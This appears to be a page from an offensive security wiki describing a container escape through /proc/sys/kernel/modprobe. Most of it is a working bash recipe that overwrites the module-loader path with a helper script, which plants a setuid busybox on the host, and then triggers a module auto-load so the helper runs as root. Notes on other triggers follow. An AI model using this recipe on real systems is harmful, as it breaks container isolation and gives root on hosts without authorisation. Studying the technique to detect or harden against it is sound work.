---
title: "modprobe path: host code execution through the module loader helper"
description: "Escaping a container by overwriting /proc/sys/kernel/modprobe, the path the kernel runs to auto-load a module, so that triggering a module load executes the attacker's program on the host as root."
keywords:
  - modprobe
  - modprobe_path
  - kernel module loader
  - container escape
  - procfs escape
---

# modprobe path

`/proc/sys/kernel/modprobe` holds the path the kernel executes, as root in the host context, whenever it needs to auto-load a kernel module. Overwrite it with a helper on a host-visible path, then trigger a module auto-load and the helper runs on the host.

```bash
# Requires CAP_SYS_ADMIN in the initial namespace or a writable host /proc
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)

cat > /x <<'SH'
#!/bin/sh
cp /bin/busybox /host_marker && chmod +s /host_marker
SH
chmod +x /x

echo "$host_path/x" > /proc/sys/kernel/modprobe

# Trigger an auto-load of a non-existent module: a socket with an unknown family/protocol works
python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0x1234)' 2>/dev/null || true
```

## Exploitation notes

- The module request runs `modprobe` as the path you set, so the value is attacker-controlled code with no module actually involved.
- Many actions trigger an auto-load: an unusual socket protocol, a filesystem type, or a netfilter feature; any one that reaches the kernel's `request_module` works.
- Same writability gate and host-visible-path requirement as [core_pattern](core_pattern.md).

## References

- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
- [Kernel: request_module and modprobe](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
